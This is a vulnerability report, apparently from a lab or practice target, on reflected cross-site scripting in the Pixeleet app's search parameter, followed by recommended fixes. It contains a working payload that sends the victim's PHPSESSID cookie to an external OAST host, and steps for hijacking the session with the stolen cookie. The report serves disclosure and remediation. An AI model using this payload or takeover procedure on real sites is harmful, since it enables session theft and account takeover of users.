# Title
Reflected Cross-Site Scripting (XSS) leading to Account Takeover (Session Hijacking)
# Vulnerability Type
Reflected Cross-Site Scripting (XSS)
# Summary
A Reflected Cross-Site Scripting (XSS) vulnerability exists in the search functionality of the Pixeleet application. The application fails to properly sanitize or encode user-supplied input within the `search` URL parameter before reflecting it back into the HTML response. An attacker can exploit this flaw to execute arbitrary JavaScript in the context of a victim's browser. This allows the attacker to steal the victim's session cookie (`PHPSESSID`), leading to full Account Takeover (ATO).
# Vulnerable Endpoint
`https://pixeleet.pwnedbox.site/index.php?search=`
# Steps to Reproduce
1. Log in to the application as a victim user.
2. Navigate to the main page or search page (e.g., `https://pixeleet.pwnedbox.site/index.php`).
3. Insert the following payload into the search parameter:  
    `'"><script>document.write('<img src=https://[YOUR-OAST-SUBDOMAIN]/${document.cookie}>')</script>`
4. Press Enter. The browser executes the payload and makes an outbound HTTP request to the attacker-controlled OAST server containing the victim's `PHPSESSID` cookie in the URL path.
5. Copy the exfiltrated `PHPSESSID` value.
6. Open a new incognito window, navigate to the application, and use a tool like Cookie-Editor to replace the current `PHPSESSID` with the stolen one.
7. Refresh the page. The attacker is now authenticated as the victim user.
# Payload Used
```html
'"><script>document.write('<img src=https://dwysbvndxyiufputctrpve8iazux8u4lz.oast.fun/${document.cookie}>')</script>
```
# Proof of Concept
1. **Vulnerability Trigger:** The payload is inserted into the search query and reflected unsanitized. 
<img width="1920" height="1080" alt="a4" src="https://github.com/user-attachments/assets/5534c745-c87a-4884-9ee5-db701fde57c6" />

2. **Payload Execution & Exfiltration:** The OAST server (Interactsh) received an HTTP GET request containing the victim's active `PHPSESSID` in the request path: `GET /PHPSESSID=[session_value] HTTP/1.1`. 
<img width="1920" height="1080" alt="a6" src="https://github.com/user-attachments/assets/3ccf1777-6735-45f4-b6a4-a119b62cf842" />

3. **Account Takeover:** The stolen session cookie was applied to the browser, granting unauthorized access to the victim's authenticated profile and dashboard. 
<img width="1920" height="1080" alt="a8" src="https://github.com/user-attachments/assets/1cade993-5e7e-44fa-9558-ea78f3d227a5" />

# Impact
- **Account Takeover:** An attacker can steal active session tokens, bypassing authentication mechanisms entirely.
- **Data Exfiltration:** Attackers can execute arbitrary JavaScript to read, modify, or delete user data, perform actions on behalf of the victim, or redirect users to malicious sites.
- **Phishing:** The vulnerability can be leveraged to display fake login prompts within the trusted origin to harvest credentials.

# Recommendation for fix
- **Output Encoding:** Ensure all user-supplied data is properly encoded before being rendered in the HTML context. For example, convert `<`, `>`, `&`, `"`, and `'` to their respective HTML entities. Use the framework's native encoding functions (e.g., `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` in PHP) to neutralize the payload.
- **HttpOnly Cookie Flag:** Set the `HttpOnly` flag on all session cookies (e.g., `PHPSESSID`). This prevents client-side JavaScript from accessing the cookie via `document.cookie`, effectively neutralizing the Account Takeover (ATO) impact even if an XSS flaw exists.
- **Security Headers (CSP):** Implement a strict Content Security Policy (CSP) to mitigate the impact of future XSS vulnerabilities. Restrict `script-src` to `'self'` to block inline scripts, and restrict `img-src` to trusted domains to prevent outbound data exfiltration to attacker-controlled servers (like OAST domains).
- **Input Validation:** Implement strict server-side input validation on the search parameter, restricting characters to an acceptable whitelist (e.g., alphanumeric and spaces) and rejecting requests containing HTML tags or special characters.
- **Secure Templating:** Avoid concatenating raw user input directly into HTML strings within the backend logic. Utilize a modern templating engine (e.g., Twig, Blade) that enforces context-aware auto-escaping by default.
